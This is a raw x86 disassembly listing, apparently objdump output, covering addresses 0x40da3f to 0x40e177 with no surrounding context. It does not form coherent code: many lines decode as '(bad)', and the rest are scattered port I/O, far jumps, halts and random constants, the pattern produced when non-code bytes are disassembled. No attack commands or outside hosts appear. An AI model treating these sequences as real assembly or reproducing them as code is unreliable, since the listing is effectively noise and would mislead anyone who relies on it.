  40da3f:	sub    DWORD PTR [esi-0x191e2da9],ebx
  40da45:	xchg   esp,eax
  40da46:	or     DWORD PTR [ebx-0x29],eax
  40da49:	and    al,0x43
  40da4b:	inc    edx
  40da4c:	jmp    0x40da34
  40da4e:	xor    eax,0xa76e1d6
  40da53:	je     0x40d9d9
  40da55:	mov    ah,0x13
  40da57:	mov    ecx,0x7ce4e6b0
  40da5c:	test   al,0x4
  40da5e:	out    0xc4,al
  40da60:	daa    
  40da61:	cmc    
  40da62:	or     dl,BYTE PTR [edi+0x31468676]
  40da68:	test   dl,ch
  40da6a:	shr    DWORD PTR [esp+ecx*4-0x3951c4a2],0xeb
  40da72:	fs xchg edx,eax
  40da75:	sar    BYTE PTR [edi],1
  40da77:	jae    0x40da2e
  40da79:	ret    0xdbac
  40da7c:	mov    edi,cs
  40da7e:	popf   
  40da7f:	add    BYTE PTR [ebx+eax*8+0x11],dh
  40da83:	mov    edi,DWORD PTR [ecx]
  40da85:	fmul   st(6),st
  40da88:	(bad)  [ebp+0x9de67e0]
  40da8e:	pusha  
  40da8f:	cmc    
  40da90:	aam    0xed
  40da92:	or     BYTE PTR [eax-0x7f],ah
  40da95:	sbb    eax,0x8005f105
  40da9a:	pop    ebx
  40da9b:	mov    ch,0xb3
  40da9d:	je     0x40daf2
  40da9f:	loopne 0x40dac3
  40daa1:	jns    0x40da26
  40daa3:	sbb    BYTE PTR [eax],0xa6
  40daa6:	xor    eax,0x74c9925b
  40daab:	(bad)  
  40daac:	pop    eax
  40daad:	aad    0xa1
  40daaf:	xchg   ebp,eax
  40dab0:	mov    dl,0xd3
  40dab2:	cmp    ch,BYTE PTR [eax-0x1f]
  40dab5:	fs push 0xffffffe8
  40dab8:	cmp    edi,edx
  40daba:	xchg   ebx,eax
  40dabb:	jbe    0x40dacb
  40dabd:	jmp    0x40db05
  40dabf:	lahf   
  40dac0:	sti    
  40dac1:	mov    eax,0x5c4c2d16
  40dac6:	mov    bl,0x42
  40dac8:	sbb    ecx,esp
  40daca:	sbb    esi,DWORD PTR [eax-0xfe57146]
  40dad0:	pop    ecx
  40dad1:	outs   dx,BYTE PTR ds:[esi]
  40dad2:	and    BYTE PTR [ebp+0x75],bl
  40dad5:	js     0x40daf2
  40dad7:	stc    
  40dad8:	cdq    
  40dad9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dada:	ins    DWORD PTR es:[edi],dx
  40dadb:	add    al,0x31
  40dadd:	push   0xffffffe3
  40dadf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dae0:	mov    bh,0xab
  40dae2:	mov    bl,0x5b
  40dae4:	jae    0x40db2a
  40dae6:	enter  0x86e0,0x91
  40daea:	xchg   ecx,eax
  40daeb:	and    ah,BYTE PTR [ebp+0x43]
  40daee:	je     0x40dabd
  40daf0:	mov    ds:0xe01f4e98,eax
  40daf5:	hlt    
  40daf6:	or     edi,ecx
  40daf8:	mov    ah,0xed
  40dafa:	outs   dx,DWORD PTR ds:[esi]
  40dafb:	sbb    eax,0x1f7c65d
  40db00:	pop    ebx
  40db01:	shr    ebp,cl
  40db03:	fs mov al,0x43
  40db06:	fisttp WORD PTR [esi-0x31]
  40db09:	xor    eax,0x2056b69d
  40db0e:	daa    
  40db0f:	add    eax,0x851afd81
  40db14:	imul   eax,DWORD PTR [esi-0x1c],0xd9e13007
  40db1b:	out    0x7b,al
  40db1d:	mov    BYTE PTR [eax-0x14],bl
  40db20:	sahf   
  40db21:	ror    edi,cl
  40db23:	imul   ecx,DWORD PTR [esi],0x766c55ab
  40db29:	repnz in al,dx
  40db2b:	push   ss
  40db2c:	int3   
  40db2d:	bswap  eax
  40db2f:	(bad)  
  40db31:	push   eax
  40db32:	jmp    0xb0c9:0xf01cf166
  40db39:	push   esi
  40db3a:	push   ebp
  40db3b:	retf   0x5d78
  40db3e:	jle    0x40db0e
  40db40:	scas   eax,DWORD PTR es:[edi]
  40db41:	push   esi
  40db42:	jmp    0x40db6f
  40db44:	test   ch,0xd4
  40db47:	nop
  40db48:	push   ecx
  40db49:	xor    eax,0xb7b7cfe9
  40db4e:	repz std 
  40db50:	adc    DWORD PTR cs:[edx-0x58297972],0x3b
  40db58:	pop    ds
  40db59:	mov    dl,0x67
  40db5b:	push   es
  40db5c:	xchg   esi,eax
  40db5d:	dec    esi
  40db5e:	(bad)
  40db61:	or     DWORD PTR [esi-0x3fc74a2a],ebx
  40db67:	jae    0x40db96
  40db69:	cld    
  40db6a:	in     al,dx
  40db6b:	fidivr DWORD PTR [edi]
  40db6d:	leave  
  40db6e:	dec    esi
  40db6f:	in     al,dx
  40db70:	pushf  
  40db71:	shl    DWORD PTR [edx+0x4afd31c1],cl
  40db77:	xchg   ebp,eax
  40db78:	jge    0x40dbda
  40db7a:	sahf   
  40db7b:	xor    eax,0x80a24061
  40db80:	repz out dx,eax
  40db82:	rol    BYTE PTR [edi-0xe],1
  40db85:	inc    edi
  40db86:	pusha  
  40db87:	mov    ds:0x26fa7640,al
  40db8c:	outs   dx,BYTE PTR ds:[esi]
  40db8d:	fild   DWORD PTR [edi-0x23d50980]
  40db93:	daa    
  40db94:	mov    eax,ds:0x651ee339
  40db99:	adc    BYTE PTR [ebp+0x17],dh
  40db9c:	and    eax,0xd5f6699a
  40dba1:	xchg   BYTE PTR [ebp-0x2e],ah
  40dba4:	cld    
  40dba5:	xchg   ebx,eax
  40dba6:	test   eax,0x41e249ff
  40dbab:	sbb    DWORD PTR [edi-0x21],edi
  40dbae:	out    0xbb,eax
  40dbb0:	sar    BYTE PTR [edx-0x2d1e814b],cl
  40dbb6:	jno    0x40dba4
  40dbb8:	pushf  
  40dbb9:	dec    esp
  40dbba:	repnz adc DWORD PTR [eax+0x674bfbe2],edx
  40dbc1:	jae    0x40db85
  40dbc3:	in     al,0xfe
  40dbc5:	out    0xc5,eax
  40dbc7:	data16 mov ch,0x2e
  40dbca:	pushf  
  40dbcb:	aaa    
  40dbcc:	xor    BYTE PTR [edx+0x4f],bh
  40dbcf:	jb     0x40db90
  40dbd1:	inc    esi
  40dbd2:	cmp    BYTE PTR [ecx*8-0x28502c7],dh
  40dbd9:	pop    esi
  40dbda:	jo     0x40db7f
  40dbdc:	(bad)  
  40dbdd:	jl     0x40dc3b
  40dbdf:	adc    dl,BYTE PTR [edi+0x2c423b9]
  40dbe5:	(bad)  
  40dbe6:	or     eax,0x2de1f662
  40dbeb:	push   cs
  40dbec:	add    BYTE PTR [edi+0x2ab294f9],ch
  40dbf2:	adc    DWORD PTR ds:0x1a82400e,0xffffffcb
  40dbf9:	xchg   DWORD PTR [ebx-0x6e],esi
  40dbfc:	mov    ss:0x61d7fac2,eax
  40dc02:	cli    
  40dc03:	sbb    ch,0x3b
  40dc06:	in     eax,dx
  40dc07:	add    BYTE PTR [ebx+0x16f75a11],al
  40dc0d:	jo     0x40dbc1
  40dc0f:	outs   dx,BYTE PTR ds:[esi]
  40dc10:	mov    esi,0x8cc556b4
  40dc15:	rcl    DWORD PTR [ecx-0x5e],0x99
  40dc19:	outs   dx,BYTE PTR ds:[esi]
  40dc1a:	dec    esp
  40dc1b:	jmp    0x9333f619
  40dc20:	(bad)  
  40dc21:	mov    dl,0x23
  40dc23:	adc    al,0xfa
  40dc25:	ss leave 
  40dc27:	dec    ebx
  40dc28:	add    eax,ebx
  40dc2a:	jmp    0x40dc99
  40dc2c:	test   ch,cl
  40dc2e:	xlat   BYTE PTR ds:[ebx]
  40dc2f:	sbb    al,0x85
  40dc31:	mov    esp,0xa4440df0
  40dc36:	sbb    bl,BYTE PTR [ebx-0x2333e5b6]
  40dc3c:	xchg   ebp,eax
  40dc3d:	(bad)  
  40dc3f:	dec    ebx
  40dc40:	fadd   QWORD PTR [ebx+0x4c]
  40dc43:	xchg   ebx,eax
  40dc44:	inc    eax
  40dc45:	in     eax,dx
  40dc46:	jns    0x40dc0a
  40dc48:	into   
  40dc49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc4a:	ret    0xb4ea
  40dc4d:	and    BYTE PTR [edi+0x19],0xbd
  40dc51:	xchg   ebx,eax
  40dc52:	aas    
  40dc53:	sti    
  40dc54:	or     DWORD PTR [ebp+0x627fc8ba],esp
  40dc5a:	mov    ebp,0x1b78a28e
  40dc5f:	jbe    0x40dc5c
  40dc61:	je     0x40dcb5
  40dc63:	sub    al,0x14
  40dc65:	dec    esp
  40dc66:	mov    cl,0xfb
  40dc68:	pop    ss
  40dc69:	inc    esi
  40dc6a:	pusha  
  40dc6b:	lahf   
  40dc6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc6d:	ja     0x40dcd4
  40dc6f:	arpl   WORD PTR [edi+ecx*4-0x2a],bp
  40dc73:	xchg   esp,eax
  40dc74:	(bad)  
  40dc75:	mov    ds:0x31f1937f,eax
  40dc7a:	sbb    bh,BYTE PTR [ecx+edx*1-0x23]
  40dc7e:	push   edi
  40dc7f:	test   DWORD PTR [ebp+0x555351e8],eax
  40dc85:	mov    dh,0x71
  40dc87:	pop    ebx
  40dc88:	jl     0x40dce2
  40dc8a:	(bad)  
  40dc8b:	out    0x81,al
  40dc8d:	popa   
  40dc8e:	mov    dh,0x34
  40dc90:	shl    BYTE PTR [edx],1
  40dc92:	cmp    al,0x9b
  40dc94:	mov    edx,0x7d009008
  40dc99:	pop    ss
  40dc9a:	jmp    0xa4a7b17a
  40dc9f:	ins    DWORD PTR es:[edi],dx
  40dca0:	cmp    DWORD PTR [ebx+0xf],ebp
  40dca3:	add    DWORD PTR [esi],esi
  40dca5:	out    0xac,al
  40dca7:	cmp    BYTE PTR ds:0x32b127ed,cl
  40dcad:	gs pop ds
  40dcaf:	push   eax
  40dcb0:	and    edx,ecx
  40dcb2:	add    al,0x29
  40dcb4:	popa   
  40dcb5:	jecxz  0x40dcbb
  40dcb7:	in     eax,0x2d
  40dcb9:	push   ebx
  40dcba:	les    edi,FWORD PTR [edi+0x52]
  40dcbd:	push   0xfffffff8
  40dcbf:	pop    DWORD PTR [ebp-0x1]
  40dcc2:	cdq    
  40dcc3:	xchg   edi,eax
  40dcc4:	push   eax
  40dcc5:	adc    BYTE PTR [ebp+0x78],0x95
  40dcc9:	push   edx
  40dcca:	mov    ecx,0xdb9994e6
  40dccf:	pop    es
  40dcd0:	or     cl,BYTE PTR [edx]
  40dcd2:	les    ecx,FWORD PTR gs:[ecx+0x7]
  40dcd6:	mov    DWORD PTR [ebx],ecx
  40dcd8:	(bad)  
  40dcda:	mov    bl,BYTE PTR [edx-0x69]
  40dcdd:	pushf  
  40dcde:	jmp    DWORD PTR [edx]
  40dce0:	shr    DWORD PTR [ebx],0xc5
  40dce3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dce4:	cmp    cl,BYTE PTR [esi]
  40dce6:	icebp  
  40dce7:	test   DWORD PTR [edx],0x54f69006
  40dced:	out    0xc8,eax
  40dcef:	xor    eax,0xd1224ba4
  40dcf4:	aas    
  40dcf5:	retf   
  40dcf6:	test   eax,0x15735ecd
  40dcfb:	and    bl,BYTE PTR [esi-0x2d]
  40dcfe:	xchg   edi,eax
  40dcff:	inc    eax
  40dd00:	pusha  
  40dd01:	lahf   
  40dd02:	loop   0x40dcc5
  40dd04:	int    0x3e
  40dd06:	mov    ds:0x41244156,al
  40dd0b:	mov    ebp,0x345ae67e
  40dd10:	xor    BYTE PTR [ecx-0x4d],al
  40dd13:	out    0x51,al
  40dd15:	or     bl,BYTE PTR [ebx+0x6cf63fe2]
  40dd1b:	mov    dl,0x52
  40dd1d:	push   esp
  40dd1e:	xor    ah,BYTE PTR [edx+0xcaa8b48]
  40dd24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd25:	adc    bh,BYTE PTR [edx+ebp*4]
  40dd28:	jmp    0x7ecc:0xdd4b2161
  40dd2f:	mov    ecx,0x329caa3e
  40dd34:	(bad)  
  40dd36:	mov    ds:0xf28d4ad2,eax
  40dd3b:	gs pop ecx
  40dd3d:	nop
  40dd3e:	xchg   esp,eax
  40dd3f:	pop    ecx
  40dd40:	push   0xffffffb4
  40dd42:	add    bh,bh
  40dd44:	dec    edi
  40dd46:	stos   DWORD PTR es:[edi],eax
  40dd47:	aam    0xf1
  40dd49:	retf   
  40dd4a:	jge    0x40dd50
  40dd4c:	push   esi
  40dd4d:	jbe    0x40dd2e
  40dd4f:	pushf  
  40dd50:	test   edx,edx
  40dd52:	loopne 0x40dd1d
  40dd54:	mov    esp,0xa041943f
  40dd59:	popf   
  40dd5a:	(bad)  
  40dd5c:	adc    ebx,0x39
  40dd5f:	jne    0x40ddbb
  40dd61:	cmp    BYTE PTR [eax+0x44],cl
  40dd64:	jl     0x40ddb6
  40dd66:	mov    ecx,0xd2a86ea3
  40dd6b:	push   ecx
  40dd6c:	mov    ah,0x32
  40dd6e:	push   ss
  40dd6f:	xor    esp,ebp
  40dd71:	cmp    edi,edx
  40dd73:	mov    bh,0x19
  40dd75:	cmp    al,cl
  40dd77:	adc    al,0x2b
  40dd79:	shl    DWORD PTR [ebx-0x21d71d65],1
  40dd7f:	cmp    al,0x9f
  40dd81:	out    0x31,eax
  40dd83:	call   0x268e:0xdcfdf616
  40dd8a:	repz scas al,BYTE PTR es:[edi]
  40dd8c:	scas   eax,DWORD PTR es:[edi]
  40dd8d:	stos   DWORD PTR es:[edi],eax
  40dd8e:	pop    edi
  40dd8f:	pop    ebp
  40dd90:	pushf  
  40dd91:	or     DWORD PTR [esi-0xb],ebp
  40dd94:	les    esp,FWORD PTR [ecx-0x44]
  40dd97:	ds dec edi
  40dd99:	mov    dh,0x7
  40dd9b:	fld    DWORD PTR [eax+edi*1]
  40dd9e:	call   0xa389:0x731e9f98
  40dda5:	sub    bl,BYTE PTR [ebx+ebx*2]
  40dda8:	jl     0x40de26
  40ddaa:	xchg   BYTE PTR [eax-0x2d],ah
  40ddad:	jno    0x40ddcc
  40ddaf:	ror    ch,1
  40ddb1:	lahf   
  40ddb2:	fidivr DWORD PTR [ecx-0x38e02f4d]
  40ddb8:	mov    esp,0xd714ed4a
  40ddbd:	sbb    edi,DWORD PTR [edi-0x73]
  40ddc0:	mov    dh,0xd9
  40ddc2:	fs jp  0x40ddbf
  40ddc5:	out    dx,eax
  40ddc6:	inc    ebx
  40ddc7:	pop    ds
  40ddc8:	ss sub eax,0x9bbe3700
  40ddce:	test   eax,0x2f45a25e
  40ddd3:	(bad)  
  40ddd4:	cld    
  40ddd5:	push   esp
  40ddd6:	jns    0x40de26
  40ddd8:	add    esp,DWORD PTR [ebx-0x35]
  40dddb:	sub    al,0x19
  40dddd:	mov    ch,0x9c
  40dddf:	mov    al,0x7e
  40dde1:	sub    DWORD PTR [ebx],0x72
  40dde4:	xchg   edx,eax
  40dde5:	pop    esi
  40dde6:	nop
  40dde7:	sbb    BYTE PTR [ecx-0x3],bl
  40ddea:	jns    0x40de68
  40ddec:	xchg   esp,eax
  40dded:	fidiv  DWORD PTR [edx]
  40ddef:	in     al,dx
  40ddf0:	xor    al,0x58
  40ddf2:	adc    eax,0xad3930de
  40ddf7:	scas   eax,DWORD PTR es:[edi]
  40ddf8:	pop    es
  40ddf9:	mov    ds:0xe95b0466,eax
  40ddfe:	pop    esi
  40ddff:	clc    
  40de00:	and    bl,bh
  40de02:	fld    QWORD PTR [edi-0x191c876f]
  40de08:	mov    esp,0x7b24cd5d
  40de0d:	inc    ecx
  40de0e:	mov    eax,0x886b1df2
  40de13:	and    al,0x5f
  40de15:	outs   dx,BYTE PTR ds:[esi]
  40de16:	pop    ds
  40de17:	fcomp  DWORD PTR [edi-0x24f73feb]
  40de1d:	mov    esp,gs
  40de1f:	(bad)  
  40de20:	sub    ch,ah
  40de22:	cdq    
  40de23:	out    0x81,al
  40de25:	iret   
  40de26:	or     DWORD PTR [eax-0x53ac6213],esi
  40de2c:	mov    edx,0x371527d9
  40de31:	add    eax,DWORD PTR [edx-0x27]
  40de34:	shr    DWORD PTR [ecx+0x59de21a5],1
  40de3a:	sub    DWORD PTR [ecx+0x11],edx
  40de3d:	jmp    0x40dea9
  40de3f:	jno    0x40de50
  40de41:	push   ebp
  40de42:	sar    BYTE PTR [eax],cl
  40de44:	repz push edi
  40de46:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40de48:	out    dx,eax
  40de49:	nop
  40de4a:	jp     0x40de02
  40de4c:	aam    0x32
  40de4e:	xor    ebx,edx
  40de50:	xchg   edi,eax
  40de51:	inc    esp
  40de52:	pusha  
  40de53:	in     eax,0x30
  40de55:	iret   
  40de56:	mov    WORD PTR [edi],cs
  40de58:	aad    0x16
  40de5a:	sar    eax,cl
  40de5c:	push   cs
  40de5d:	jmp    0x825f:0x5f47908d
  40de64:	cld    
  40de65:	pop    ecx
  40de66:	gs mov cl,0xd7
  40de69:	sti    
  40de6a:	fidiv  DWORD PTR [ecx+esi*8]
  40de6d:	mov    ds:0x8ed3c2de,eax
  40de72:	push   edi
  40de73:	pushf  
  40de74:	fld    QWORD PTR [ebp-0x5b]
  40de77:	inc    esp
  40de78:	pop    es
  40de79:	adc    bl,0xf0
  40de7c:	pop    esi
  40de7d:	aad    0x9c
  40de7f:	cmp    eax,0xfd952f9a
  40de84:	cs hlt 
  40de86:	sar    DWORD PTR [ebp-0x40574426],0xd6
  40de8d:	mov    ecx,0x8d74ac95
  40de92:	frstor [ebp-0x68baefdb]
  40de98:	pop    ds
  40de99:	jne    0x40def6
  40de9b:	jg     0x40de59
  40de9d:	xlat   BYTE PTR ds:[ebx]
  40de9e:	in     eax,dx
  40de9f:	mov    BYTE PTR [ebp*4+0x7a7c5028],dh
  40dea6:	pop    eax
  40dea7:	mov    edx,es
  40dea9:	pusha  
  40deaa:	lods   al,BYTE PTR ds:[esi]
  40deab:	pop    edx
  40deac:	inc    ebx
  40dead:	ss jp  0x40de4b
  40deb0:	mov    esp,0xb73b1226
  40deb5:	adc    DWORD PTR [edx],edi
  40deb7:	aad    0x3
  40deb9:	or     al,0x3e
  40debb:	push   edi
  40debc:	cmp    DWORD PTR ds:0xf9b3a27b,edi
  40dec2:	xor    ch,dl
  40dec4:	std    
  40dec5:	dec    edi
  40dec6:	inc    ecx
  40dec7:	test   eax,0xad6f266
  40decc:	xchg   ecx,eax
  40decd:	adc    DWORD PTR [ebx],esi
  40decf:	xlat   BYTE PTR ds:[ebx]
  40ded0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ded1:	imul   DWORD PTR [ebx+edx*1]
  40ded4:	fsub   DWORD PTR [edi+0x2c]
  40ded7:	jnp    0x40dedb
  40ded9:	inc    edx
  40deda:	jp     0x40dee2
  40dedc:	xor    al,0x84
  40dede:	sbb    al,0xf7
  40dee0:	cmp    dl,bh
  40dee2:	iret   
  40dee3:	test   BYTE PTR [ebx-0x4e],cl
  40dee6:	sti    
  40dee7:	push   0x2c0b2469
  40deec:	mov    ecx,0xb6ba14ea
  40def1:	or     DWORD PTR [ebp-0x2eac79f2],0x2
  40def8:	daa    
  40def9:	fistp  WORD PTR [edi]
  40defb:	or     ebx,edi
  40defd:	xor    BYTE PTR ds:[esi+0x218c9df],bh
  40df04:	xlat   BYTE PTR ds:[bx]
  40df06:	shl    bh,cl
  40df08:	xchg   edx,eax
  40df09:	and    DWORD PTR ds:0x8c93e09d,esp
  40df0f:	cmp    eax,0xdf72854b
  40df14:	xlat   BYTE PTR ds:[ebx]
  40df15:	scas   al,BYTE PTR es:[edi]
  40df16:	rcl    BYTE PTR [ebx-0x2b4bd5ce],cl
  40df1c:	pop    ds
  40df1d:	popf   
  40df1e:	clc    
  40df1f:	je     0x40def7
  40df21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df22:	sbb    DWORD PTR [esi],ebx
  40df24:	push   ebp
  40df25:	add    al,0x51
  40df27:	pop    DWORD PTR ds:0x897b2dfe
  40df2d:	or     ebx,DWORD PTR [ebp-0x775747f4]
  40df33:	xchg   esi,eax
  40df34:	adc    ebp,DWORD PTR [ebp+0x7]
  40df37:	mov    bl,0x78
  40df39:	aaa    
  40df3a:	daa    
  40df3b:	ja     0x40df96
  40df3d:	retf   
  40df3e:	dec    ecx
  40df3f:	clc    
  40df40:	fnsave [edi+edi*2+0x74]
  40df44:	and    ebp,DWORD PTR [edx]
  40df46:	cdq    
  40df47:	loop   0x40deef
  40df49:	mov    DWORD PTR [ebx],edi
  40df4b:	dec    ecx
  40df4c:	pop    eax
  40df4d:	aas    
  40df4e:	mov    eax,ds:0x12509a6a
  40df53:	test   BYTE PTR [edi+ecx*4+0x50],cl
  40df57:	add    edx,DWORD PTR [ecx+0x2c]
  40df5a:	stc    
  40df5b:	and    esi,DWORD PTR [edi+0x43]
  40df5e:	popa   
  40df5f:	xor    ch,dh
  40df61:	inc    eax
  40df62:	test   eax,0x28d4abf
  40df67:	clc    
  40df68:	iret   
  40df69:	mov    DWORD PTR [eax-0x4a],0x319b0d10
  40df70:	pop    edi
  40df71:	mov    ds:0xcd720b78,al
  40df76:	push   ds
  40df77:	shl    dh,cl
  40df79:	xchg   esi,eax
  40df7a:	jno    0x40df7a
  40df7c:	jle    0x40df01
  40df7e:	and    al,0xfa
  40df80:	xchg   esi,eax
  40df81:	and    eax,0xa95212e9
  40df86:	nop
  40df87:	in     al,0xf0
  40df89:	cli    
  40df8a:	jmp    0x3686:0x8150c355
  40df91:	adc    DWORD PTR [ebp+0x49bc7a03],ebp
  40df97:	dec    ecx
  40df98:	inc    ebx
  40df99:	jbe    0x40dffc
  40df9b:	push   0xffffffde
  40df9d:	or     eax,DWORD PTR [ebx+0x5a024504]
  40dfa3:	xor    cl,ah
  40dfa5:	mov    eax,0x4169fe4e
  40dfaa:	popf   
  40dfab:	popa   
  40dfac:	inc    edi
  40dfad:	test   bh,dl
  40dfaf:	loopne 0x40df80
  40dfb1:	push   ebx
  40dfb2:	imul   esp,DWORD PTR [edx-0x4c],0xafa863d3
  40dfb9:	or     al,0xc6
  40dfbb:	(bad)  
  40dfbc:	fdiv   DWORD PTR ds:0x4e9ab872
  40dfc2:	or     al,0xb2
  40dfc4:	shl    BYTE PTR [edi],1
  40dfc6:	or     DWORD PTR [si+0x5238],edx
  40dfcb:	ficom  WORD PTR ds:0xf1fa8d46
  40dfd1:	mov    dl,0x20
  40dfd3:	jae    0x40dfa2
  40dfd5:	outs   dx,DWORD PTR ds:[esi]
  40dfd6:	mov    esi,0x2849aea8
  40dfdb:	arpl   WORD PTR [eax+eax*1+0x79],bp
  40dfdf:	jno    0x40dffd
  40dfe1:	fisub  DWORD PTR [ebp-0x7f]
  40dfe4:	cmp    ecx,DWORD PTR [eax]
  40dfe6:	sub    cl,BYTE PTR [ecx]
  40dfe8:	xchg   ecx,eax
  40dfe9:	push   ebp
  40dfea:	js     0x40e044
  40dfec:	stos   DWORD PTR es:[edi],eax
  40dfed:	das    
  40dfee:	test   ebx,esi
  40dff0:	mov    edx,0xf32607ae
  40dff5:	ins    DWORD PTR es:[edi],dx
  40dff6:	add    DWORD PTR [esi-0x7f48351f],0x76
  40dffd:	and    DWORD PTR [esi],ebp
  40dfff:	in     al,0x45
  40e001:	jmp    0x40e05a
  40e003:	popf   
  40e004:	mov    al,0x16
  40e006:	mov    al,0x18
  40e008:	shl    DWORD PTR [edi+0x3c],1
  40e00b:	scas   eax,DWORD PTR es:[edi]
  40e00c:	fwait
  40e00d:	in     al,dx
  40e00e:	or     DWORD PTR [esi],edx
  40e010:	mov    edi,0xcab40428
  40e015:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e016:	repz (bad) 
  40e01a:	mov    eax,0x99e4e3ec
  40e01f:	add    dh,BYTE PTR ds:0xbdfe6418
  40e025:	dec    ebp
  40e026:	(bad)  
  40e027:	xchg   esp,eax
  40e028:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e029:	mov    al,BYTE PTR [esi-0xeeca74a]
  40e02f:	xchg   esp,eax
  40e030:	mov    bh,BYTE PTR [esi+0x2ae346dd]
  40e036:	adc    BYTE PTR [eax+ecx*4+0x15],dh
  40e03a:	inc    ebp
  40e03b:	ja     0x40dffc
  40e03d:	iret   
  40e03e:	(bad)  
  40e03f:	dec    ebx
  40e040:	lahf   
  40e041:	pop    esi
  40e042:	in     al,0x69
  40e044:	pop    eax
  40e045:	mov    esi,0xac337cfa
  40e04a:	scas   eax,DWORD PTR es:[edi]
  40e04b:	sub    al,0xd0
  40e04d:	lds    edx,FWORD PTR [edx+edi*2]
  40e050:	dec    eax
  40e051:	pop    es
  40e052:	pop    edx
  40e053:	rcr    DWORD PTR [esi],cl
  40e055:	ret    
  40e056:	in     al,dx
  40e057:	xor    DWORD PTR [ebx-0x58fe7e04],edi
  40e05d:	xor    DWORD PTR [ecx+0x1b],ebp
  40e060:	sub    al,0x14
  40e062:	test   DWORD PTR [ecx+0x5bda398c],edx
  40e068:	aad    0xfe
  40e06a:	mov    ecx,0x7d20d33e
  40e06f:	jbe    0x40e0e4
  40e071:	(bad)  
  40e072:	retf   0x2180
  40e075:	rcr    DWORD PTR ds:[eax+0x75],1
  40e079:	sahf   
  40e07a:	adc    eax,DWORD PTR gs:[esi]
  40e07d:	in     eax,0x8a
  40e07f:	stos   DWORD PTR es:[edi],eax
  40e080:	jl     0x40e07e
  40e082:	xchg   edi,eax
  40e083:	aas    
  40e084:	repnz popa 
  40e086:	shl    DWORD PTR [edi],1
  40e088:	in     eax,0xbf
  40e08a:	and    eax,0xf70736b8
  40e08f:	xor    cl,BYTE PTR [eax-0x59]
  40e092:	jge    0x40e032
  40e094:	push   ebx
  40e095:	inc    edx
  40e096:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e097:	mov    bh,0x32
  40e099:	scas   eax,DWORD PTR es:[edi]
  40e09a:	rcr    BYTE PTR [ebx-0x32],cl
  40e09d:	retf   0x4da7
  40e0a0:	shl    BYTE PTR [edx+eiz*2],0xba
  40e0a4:	call   0xc6e40f3a
  40e0a9:	and    DWORD PTR [ecx+0x69],edi
  40e0ac:	mov    ch,0xfe
  40e0ae:	push   es
  40e0af:	pop    ds
  40e0b0:	jmp    0xe4f40b00
  40e0b5:	test   al,0xa7
  40e0b8:	out    dx,al
  40e0b9:	scas   al,BYTE PTR es:[edi]
  40e0ba:	dec    edx
  40e0bb:	retf   0x958
  40e0be:	out    0x45,al
  40e0c0:	int    0x8d
  40e0c2:	sbb    dl,BYTE PTR [esi-0x45]
  40e0c5:	std    
  40e0c6:	ja     0x40e11e
  40e0c8:	popf   
  40e0c9:	fbstp  TBYTE PTR [ebx-0x26]
  40e0cc:	sahf   
  40e0cd:	adc    BYTE PTR [eax],bl
  40e0cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0d0:	sub    ah,ah
  40e0d2:	sbb    edi,DWORD PTR [ebx+0x5b]
  40e0d5:	mov    bl,BYTE PTR [eax+ecx*2+0x5]
  40e0d9:	sub    ecx,ebp
  40e0db:	sbb    edi,DWORD PTR [edi]
  40e0dd:	and    ah,dl
  40e0df:	push   edi
  40e0e0:	inc    ebp
  40e0e1:	ret    
  40e0e2:	sbb    al,al
  40e0e4:	sub    edx,edx
  40e0e6:	inc    ebp
  40e0e7:	pop    esp
  40e0e8:	(bad)  
  40e0e9:	call   0xbb78e5ee
  40e0ee:	mov    ds:0xad397a22,al
  40e0f3:	sub    dl,BYTE PTR [esi]
  40e0f5:	dec    edx
  40e0f6:	mov    fs,WORD PTR [edi]
  40e0f8:	ins    DWORD PTR es:[edi],dx
  40e0f9:	mov    bh,BYTE PTR [eax-0x2d]
  40e0fc:	xchg   edi,eax
  40e0fd:	data16 imul BYTE PTR [eax+ecx*4]
  40e101:	cld    
  40e102:	shl    DWORD PTR ds:0x1268f5f5,cl
  40e108:	dec    edi
  40e109:	inc    esp
  40e10a:	mov    ebp,0xe687b776
  40e10f:	inc    esi
  40e110:	in     al,0xd9
  40e112:	or     BYTE PTR [edx],dh
  40e114:	or     BYTE PTR [edi-0x3],ah
  40e117:	scas   al,BYTE PTR es:[edi]
  40e118:	xchg   BYTE PTR [edx],bl
  40e11a:	fwait
  40e11b:	push   0xb31e6690
  40e120:	out    dx,al
  40e121:	fsubr  DWORD PTR [esi]
  40e123:	fbld   TBYTE PTR [ecx]
  40e125:	pop    esp
  40e126:	mov    DWORD PTR [esi+0x16],eax
  40e129:	cmp    eax,0x764a65f9
  40e12e:	pushf  
  40e12f:	sbb    BYTE PTR [eax],cl
  40e131:	(bad)  
  40e132:	out    0xc4,eax
  40e134:	lods   al,BYTE PTR ds:[esi]
  40e135:	aad    0xca
  40e137:	cmp    esi,DWORD PTR [edx+0x31b4ad8a]
  40e13d:	mov    al,dh
  40e13f:	imul   edi,DWORD PTR [edi+edi*2-0x3e],0x24c08a5b
  40e147:	aaa    
  40e148:	cwde   
  40e149:	push   cs
  40e14a:	pop    esi
  40e14b:	mov    al,ds:0xb237b2c3
  40e150:	dec    eax
  40e151:	inc    edi
  40e152:	hlt    
  40e153:	lods   eax,DWORD PTR ds:[esi]
  40e154:	stos   DWORD PTR es:[edi],eax
  40e155:	out    dx,eax
  40e156:	jmp    FWORD PTR [ecx]
  40e158:	lods   eax,DWORD PTR ds:[esi]
  40e159:	loopne 0x40e14e
  40e15b:	loop   0x40e193
  40e15d:	jns    0x40e1ba
  40e15f:	sbb    DWORD PTR [ebp-0x63bd9fdd],edi
  40e165:	mov    ecx,0xe64bf260
  40e16a:	bound  eax,QWORD PTR [eax]
  40e16c:	test   al,0x88
  40e16e:	mov    ebx,0xe7459b9f
  40e173:	push   0xffffffd7
  40e175:	aas    
  40e176:	inc    edi
  40e177:	pop    eax
